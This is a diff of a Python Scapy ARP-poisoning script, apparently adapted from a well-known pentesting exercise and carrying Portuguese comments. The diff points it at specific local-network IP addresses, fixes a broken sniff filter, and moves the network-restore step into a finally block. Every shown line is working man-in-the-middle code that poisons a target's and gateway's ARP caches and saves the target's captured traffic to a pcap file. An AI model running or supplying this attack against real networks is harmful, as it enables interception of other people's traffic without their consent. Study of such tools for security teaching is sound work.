@@ -6,18 +6,12 @@ import threading
 import signal
 
 
-interface = "en1"
+interface = "wlo1"
 #lembrar de editar o parametro para receber o ip dinamicamente
-target_ip = "10.0.2.15"
+target_ip = "192.168.31.232"
 #lembrar de editar o parametro para receber o ip dinamicamente
-gateway_ip = "10.0.2.15"
+gateway_ip = "192.168.30.9"
 packet_count = 1000
-
-#define a nossa interface
-conf.iface = interface
-
-#desabilita a saída
-conf.verb = 0
 
 print("[*] Setting up %s" % interface)
 
@@ -71,6 +65,12 @@ def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
 
     return
 
+#define a nossa interface
+conf.iface = interface
+
+#desabilita a saída
+conf.verb = 0
+
 gateway_mac = get_mac(gateway_ip)
 
 if gateway_mac is None:
@@ -90,15 +90,15 @@ try:
     print("[*] Starting sniffer for %d packets" % packet_count)
 
     bpf_filter = "ip host %s" % target_ip
-    packets = sniff(count=packet_count, filter=bpf, iface=interface)
+    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
 
     #grava os pacotes capturados
     wrpcap('arper.pcap',packets)
 
-    #restaura a rede
-    restore_target(gateway_ip, gateway_mac, target_mac)
-
 except KeyboardInterrupt:
+    pass
+
+finally:
     #restaura a rede
     restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
     sys.exit(0)
